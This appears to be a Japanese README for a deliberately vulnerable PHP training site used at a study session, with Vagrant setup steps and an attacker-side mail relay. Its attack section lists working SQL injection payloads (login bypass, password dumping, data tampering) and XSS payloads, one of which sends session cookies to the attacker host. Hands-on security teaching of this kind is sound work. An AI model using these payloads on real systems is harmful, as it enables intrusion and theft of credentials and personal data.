# TBKHACK-DEMO
====

勉強会で利用したWebアプリケーション脆弱性攻撃用サイトです。  
SQLインジェクションやXSSを攻撃しやすく作ってますので、構成等はめちゃくちゃですｗ  


## 脆弱性サイト構築手順

Virtual BoxとVagrantで作っていきます。  
事前にインストールしておいてください。  
手順はMacOSのみです。  

（Macにて）
* vagrant用ディレクトリ作成と移動
```sh
mkdir ~/dev/vagrant/tbk-demo && cd $_
```
* vagrant boxのtbkと名付けてダウンロード
```sh
vagrant box add tbk http://opscode-vm-bento.s3.amazonaws.com/vagrant/virtualbox/opscode_centos-6.7_chef-provisioner
```
 box追加確認

 ```sh
 vagrant box list
 ```
※ tbkあったらOKです。

* vagrant初期化
```sh
vagrant init
```

* vagrantfileを修正  
  ```sh
  vim vagrantfile
  ```

  ```
  ...

    # Create a private network, which allows host-only access to the machine
    # using a specific IP.
     config.vm.network "private_network", ip: "192.168.33.10"

     ...
   ```
* 仮想マシンの起動
```sh
vagrant up
```

* 仮想マシンへのログイン
```sh
vagrant ssh
```

(仮想マシンにて)

* パッケージ更新
  ```sh
  sudo yum update
  ```

* Apacheのインストール
  ```sh
  sudo yum install -y httpd
  ```

* MySQLのインストール
```sh
sudo yum install http://dev.mysql.com/get/mysql-community-release-el6-5.noarch.rpm
sudo yum install mysql-server
```

* PHP5.5のインストール
```sh
sudo rpm -Uvh http://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm
sudo rpm -Uvh http://rpms.famillecollet.com/enterprise/remi-release-6.rpm
yum install --enablerepo=remi --enablerepo=remi-php55 pphp php-mbstring php-mysqlnd php-pdo
```

* サービス起動
```sh
sudo service httpd start
sudo service mysqld start
```

* MySQLの設定
```sh
mysql -u root
```
sql/create-table.sqlを実行

* プログラムの登録
/var/www/html配下にTBK-HMを配置

## 悪いサイト構築手順
※ 事前に上記の脆弱性サイトと同じ手順でvagrantを構築。  
　ipアドレスは192.168.33.20とします。  

* 事前準備
vagrant上のCentOSにphp5.5、apache(httpd)は導入。  
evelを/var/www/htmlに配置する。

* postfix導入
```sh
sudo yum install postfix cyrus-sasl-md5 cyrus-sasl-plain
```

* /etc/postfix/main.cf編集
vimなんかのエディタで作成しても、vagrant共有に持ってきてローカルで編集しても構いません。

  ```
  # 116行目　inet_interfaces = localhostを編集
  inet_interfaces = all

  # 119行目　inet_protocols = allを編集
  inet_protocols = ipv4

  # 318行目　以下追加
  relayhost = [smtp.gmail.com]:587
  smtp_use_tls = yes
  smtp_sasl_auth_enable = yes
  smtp_sasl_password_maps = hash:/etc/postfix/sasl_passwd
  smtp_sasl_tls_security_options = noanonymous
  smtp_sasl_mechanism_filter = plain
  smtp_sasl_security_options = noanonymous
  smtp_tls_CApath = /etc/pki/tls/certs/ca-bundle.crt
  ```

* /etc/postfix/sasl_passwd作成
vimなんかのエディタで作成しても、ローカルにsasl_passwdファイルを作ってvagrant共有して
/etc/postfixに配置しても良いです。
ファイルの中身は下記。gmailを想定しています。  
[smtp.gmail.com]:587 example@gmail.com:パスワード

* asl_passwdをsasl_passwdファイルをdb化
```sh
cd /etc/postfix
postmap sasl_passwd
```

* サービス起動
```sh
sudo service postfix start
```

* メール送信テスト  
```sh
sendmail.postfix [メールアドレス]
Subject: [件名]
test
.
```
宛先にメールが送信されたことを確認しましょう。

* /etc/php.ini編集  
vimなんかのエディタで作成しても、vagrant共有に持ってきてローカルで編集しても構いません。  
```
...
[mail function]
; For Unix only.  You may supply arguments as well (default: "sendmail -t -i").
; http://php.net/sendmail-path
sendmail_path = /usr/sbin/sendmail.postfix -t -i
...
```

## 攻撃パターン
### SQLインジェクション
【ログイン認証回避】  
```
http://192.168.33.10/TBK-HM/login.html
```
```
id:100001
pass:' or 'a'='a
```

【パスワード漏えい】   
```
http://192.168.33.10/TBK-HM/list.php?tg=1 union select '','',user_id,password from password
```

【情報漏えい】  
```
http://192.168.33.10/TBK-HM/list.php?tg=1 union select user_name,'',user_email,user_address from user
```

【情報改ざん】  
```
http://192.168.33.10/TBK-HM/list.php?tg=1;update book set bookname='hacking!' where isbn13='978-4041205570'
```

### XSS
[chrome xss-auditor解除]  
ターミナルで実行  
```
open -a Google\ Chrome --args --disable-xss-auditor
```

【alert】  
```
http://192.168.33.10/TBK-HM/confirm.php?isbn13=99999999&isbn10=99999999&bookname=<script>alert(1)</script>&author=aaa
```

【cookie】  
```
http://192.168.33.10/TBK-HM/confirm.php?isbn13=99999999&isbn10=99999999&bookname=<script>alert(document.cookie)</script>&author=aaa
```

【session漏洩】  
```
http://192.168.33.10/TBK-HM/confirm.php?isbn13=9&isbn10=9&bookname=<script>window.location='http://192.168.33.20/sendmail.php?p='%2Bdocument.cookie;</script>&author=aaa
```

【改ざん】  
```
http://192.168.33.20/trap_input.html
```

### CSRF
```
http://192.168.33.20/trap_threat.html
```
